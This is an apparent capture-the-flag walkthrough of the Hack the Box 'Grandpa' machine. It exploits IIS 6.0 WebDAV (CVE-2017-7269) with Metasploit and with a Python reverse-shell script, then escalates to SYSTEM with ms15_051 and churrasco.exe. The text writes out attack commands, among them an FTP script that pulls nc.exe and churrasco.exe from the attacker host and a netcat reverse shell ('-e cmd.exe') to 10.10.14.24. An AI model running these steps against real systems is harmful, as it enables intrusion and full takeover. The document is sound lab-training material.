# Grandpa - HTB

Grandpa - 10.10.10.14

![](/images/grandpa/1. grandpa.png "Grandpa Info Card")

Contents:

1. TOC
{:toc}

<p>&nbsp;</p>
=======================================================

## Introduction

=======================================================

Grandpa represents an older Windows target in the easy category on Hack the Box. It's age and vulnerable software offer several paths to system privileges. 

<p>&nbsp;</p>
=======================================================

## Tools & Techniques Used

=======================================================

Grandpa runs an old, vulnerable version of Microsoft's IIS webserver. We spend some time in the meterpreter session to work through a minor issue with our exploit which yields minimal privileges in the initial shell. We then use Metasploit's local exploit suggester to find a privilege escalation option and gain system privileges. 

For manual exploitation, we find a python script on github to obtain a shell and then use a second python script to find a privilege escalation option. This machine is also vulnerable to token smuggling, so for manual exploitation we explore a different option from that which is offered by Metasploit and by the python scripts we run. 

-1- nmap

-2- msfconsole

-3- msf module: exploit/windows/iis/iis_webdav_scstoragepathfromurl

-4- meterpreter process migration

-5- msfmodule: post/multi/recon/local_exploit_suggester

-6- msfmodule: exploit/windows/local/ms15_051_client_copy_image

-7- python iis6 reverse shell script

-8- Windows-Exploit-Suggester.py

-9- churrasco.exe

-10- python ftp server (pyftpdlib)

-11- ftp scripting on Windows

-12- nc

<p>&nbsp;</p>
=======================================================

## Scanning and Enumeration

=======================================================

We start with our usual nmap command:

    nmap -A -T4 10.10.10.14

![](/images/grandpa/2. nmap.png)

We see port 80 open and that's it. Microsoft IIS 6.0. We can do a quick search on IIS 6.0 and find: https://en.wikipedia.org/wiki/Internet_Information_Services

![](/images/grandpa/3. wiki.png)

Windows XP or Server 2003? Initial enumeration shows this machine might be old, hence the name Grandpa. Let's do a quick searchsploit for IIS 6.0:

    searchsploit IIS 6.0

![](/images/grandpa/4. searchsploit.png)

We have several remote options, but no Metasploit module. Since the WebDAV Remote Authentication Bypass seems to have been a big deal, let's try Google again:

    microsoft iis 6.0 exploit

![](/images/grandpa/5. google.png)

And two solid results are near the top: Rapid7 and Exploit-db:

[https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl)

[https://www.exploit-db.com/exploits/41738](https://www.exploit-db.com/exploits/41738)

Rapid7 is a Metasploit module so let's start there.


<p>&nbsp;</p>
=======================================================

## Exploitation using Metasploit

=======================================================

We start with the information on the rapid7 website: [https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl)

![](/images/grandpa/6. rapid7_1.png)
![](/images/grandpa/6. rapid7_2.png)

Let's load up msfconsole and get to work:

    msfconsole
    
    use exploit/windows/iis/iis_webdav_scstoragepathfromurl

![](/images/grandpa/7. msfconsole.png)

So we need to set RHOSTS, but that's about it on this one:

    set RHOSTS 10.10.10.14

    run

![](/images/grandpa/8. run.png)

We have a meterpreter shell. Let's get some of the basics:

    getuid
    
    sysinfo

![](/images/grandpa/9. getuid.png)

The “Access is denied” error for getuid is different. It likely means we have exploited onto this machine as a process or service with absolutely minimal privileges. 

Fortunately we can migrate over to another process. First we need to list running processes:

    ps

![](/images/grandpa/10. ps.png)

To migrate to a different process, we issue the “migrate” command and the process id (PID). Any process that does not show the user or path is likely out of reach (run by NT/Authority System or a user with privileges we cannot access). 

In this case we have one candidate so let's try migrating into process 488:

    migrate 488

![](/images/grandpa/11. migrate.png)
![](/images/grandpa/12. getuid.png)

Much better. Let's background our meterpreter session and run a local exploit suggester to gain system: Ctrl+z

    search suggester

    use 0

    set session 1

    run

![](/images/grandpa/13. suggester.png)
![](/images/grandpa/14. run.png)

So we have several exploits to choose from. We've used ms10_015_kitrap0d previously on the Devel machine, so let's choose something else like ms15_051.

Note: If you are feeling adventurous you can also come back and use ms14_070 as it should work as well.

    search ms15_051

    use 0
   
    show options

![](/images/grandpa/15. search.png)

Straightforward enough. Set the session to 1 and make sure your Target is set to Windows x86 (should be the default).

    set session 1
 
    run
    
If you see Metasploit start the reverse TCP handler on an interface other than tun0 (should be 10.10.x.x), then hit Ctrl+c immediately to cancel.

![](/images/grandpa/16. run.png)

For this one, Metasploit set us up on the wrong interface, so we need to cancel and then set our lhost and lport manually:

    set lhost 10.10.14.24

    set lport 17012

I have tried setting lhost and lport before running the exploit and even searching for the option to appear prior to running it, but the only way I see these options is to run it once and hit Ctrl+c.

With lhost and lport set, we should be good to go:

    run

![](/images/grandpa/17. run.png)

We receive a reverse connection and a new meterpreter shell, let's confirm our user and obtain a shell:

    getuid

    shell
    
![](/images/grandpa/18. getuid.png)

Success! We system level privileges. Let's go get our flags:

    type "C:\Documents and Settings\Administrator\Desktop\root.txt"

    type "C:\Documents and Settings\Harry\Desktop\user.txt"

![](/images/grandpa/19. flags.png)

And there are our flags:


<p>&nbsp;</p>
=======================================================

## Manual Exploitation

=======================================================

From our initial research we found the following Exploit-db page: [https://www.exploit-db.com/exploits/41738](https://www.exploit-db.com/exploits/41738)

![](/images/grandpa/20. exploit-db.png)

This is the same vulnerability we used via Metasploit, but now we can run it manually. It should already exist on your Kali machine, but if not you can download it from the above website.

In a Kali terminal:

    searchsploit 41738

Copy 41738.py to your local directory

![](/images/grandpa/21. copy.png)

Now we need to take a look at the code and make any required modifications to get it to work for us:

    gedit 41738.py &
    
![](/images/grandpa/21. 41738.png)

(output trimmed)

![](/images/grandpa/21. 41738_2.png)

The comments in the code state it is a buffer overflow ROP chain against ScStoragePathFromUrl, but no CVE is provided. The code we have is proof of concept to execute calc.exe through localhost (127.0.0.1:80). We could easily modify it and provide the IP address for Grandpa, but the rest of the code is still set for calc.exe and to modify it is beyond the scope of this write-up.

After searching for a bit, I found the CVE for this WebDAV exploit is CVE-2017-7269. That led me to search for another option on github: Google "CVE-2017–7269 exploit github". 

![](/images/grandpa/22. google.png)

A github repo by g0rx should be one of the choices: [https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell)

This python script by g0rx is a modification of 41738.py.

![](/images/grandpa/23. g0rx.png)

Go to g0rx's “iis6 reverse shell” and click the Raw view. Copy/paste the code into your own “exploit.py” on Kali:

![](/images/grandpa/24. exploit_py.png)

So our command to exploit will be:

    python exploit.py 10.10.10.14 80 10.10.14.24 17011

First we need to set up a nc listener on port 17011 to catch the reverse connection. In a separate terminal window:

    nc -lvnp 17011

![](/images/grandpa/25. nc_listener.png)

Note: This python exploit appears to only work once before requiring a reset of the box. So if you are trying it multiple times, reset Grandpa first.

Now back in the first terminal window, send the exploit:

![](/images/grandpa/26. python_exploit.png)

This window should appear to hang, but over in your nc listener window you should see:

![](/images/grandpa/27. nc_connection.png)

Now we have a shell on the machine, let's see what privileges we have:
 
    whoami

![](/images/grandpa/28. whoami.png)

So we are a low-privileged network service. Time to privesc! 

First, let's grab our systeminfo and run it against a Windows exploit suggester back on Kali. In your windows shell:

    systeminfo

![](/images/grandpa/29. systeminfo.png)
Note: output snipped from the above screenshot.

Now, copy/paste all of the output to a “grandpa.systeminfo” back on your Kali machine:

![](/images/grandpa/30. sysinfo_file.png)

Save the grandpa.systeminfo file. Now we are going to use a python script called “Windows-Exploit-Suggester” to analyze the systeminfo file and recommend paths to privesc.

You can download the Windows Exploit Suggester here: [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

Once it is installed, you will need to download a local copy of the database in order for the script to run correctly. The script refers to this as an “update”:

    ./windows-exploit-suggester.py -u

![](/images/grandpa/31. wes.png)

Now we can run the exploit suggester script against the systeminfo file:

    ./windows-exploit-suggester.py -i /root/labs/htb/grandpa/grandpa.systeminfo -d 2020-05-09-mssb.xls

You will get an extensive list of exploits to try on this machine, some of which we also saw in the Metasploit suggester earlier. However there is a different way to privesc through token smuggling: [https://medium.com/@nmappn/windows-privelege-escalation-via-token-kidnapping-6195edd2660e](https://medium.com/@nmappn/windows-privelege-escalation-via-token-kidnapping-6195edd2660e)

Kali linux normally has “churrasco.exe” already installed here: /usr/share/sqlninja/apps/churrasco.exe

We will also need a nc.exe file to use. Kali has one here: /usr/share/sqlninja/apps/nc.exe

Copy both of those files to your working directory.

![](/images/grandpa/32. ls.png)

Now we can run pyftp to transfer the files over to Grandpa using ftp. On our Kali machine: 

    python -m pyftpdlib -p21

![](/images/grandpa/33. pyftp.png)

Over on our Windows shell (Grandpa) we can echo commands into a txt file to run ftp in a script mode. We need to do this twice, once for each file we need to transfer:

    echo open 10.10.14.24 21> ftp.txt&echo USER anonymous >> ftp.txt&echo anonymous>> ftp.txt&echo bin>> ftp.txt&echo GET churrasco.exe >> ftp.txt&echo bye>> ftp.txt
    
    ftp -v -n -s:ftp.txt

    del ftp.txt

    echo open 10.10.14.24 21> ftp.txt&echo USER anonymous >> ftp.txt&echo anonymous>> ftp.txt&echo bin>> ftp.txt&echo GET nc.exe >> ftp.txt&echo bye>> ftp.txt
    
    ftp -v -n -s:ftp.txt

![](/images/grandpa/34. ftp.png)

Note: The above screenshot only shows one set of the commands above, for churrasco.exe. You need to repeat the steps for nc.exe as well.

On your Kali terminal window you should see the ftp connections and transfer:
 
 ![](/images/grandpa/35. pyftp.png)

Next, we set up a listener on Kali to catch our reverse connection:

    nc -lvnp 17013

Then over on Grandpa:

    churrasco.exe -d "C:\Windows\Temp\nc.exe 10.10.14.24 17013 -e cmd.exe"

![](/images/grandpa/36. churrasco.png)

And back in our Kali terminal:

![](/images/grandpa/37. nc_connection.png)

Success! We are system. Let's go get our flags:

    type "C:\Documents and Settings\Administrator\Desktop\root.txt"

    type "C:\Documents and Settings\Harry\Desktop\user.txt"

![](/images/grandpa/38. flags.png)

And there are our flags.


<p>&nbsp;</p>
=======================================================

## Final Code

=======================================================

iis6-exploit.py (exploit.py from the above write-up): [https://github.com/rax-register/code_examples/blob/master/iis6-exploit.py](https://github.com/rax-register/code_examples/blob/master/iis6-exploit.py)

<p>&nbsp;</p>
=======================================================

## Links & Additional Reading

=======================================================

1. CVE-2017-7269 entry: [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7269](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7269)
2. Rapid7 Metasploit module entry: [https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl)
3. Exploit-db entry: [https://www.exploit-db.com/exploits/41738](https://www.exploit-db.com/exploits/41738)
4. g0rx github repo: [https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell)
5. Windows Exploit Suggester on github: [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
6. Windows token smuggling (churrasco.exe): [https://medium.com/@nmappn/windows-privelege-escalation-via-token-kidnapping-6195edd2660e](https://medium.com/@nmappn/windows-privelege-escalation-via-token-kidnapping-6195edd2660e)

<p>&nbsp;</p>

=======================================================

![rax logo](/images/rax_intel.png)

<p>&nbsp;</p>
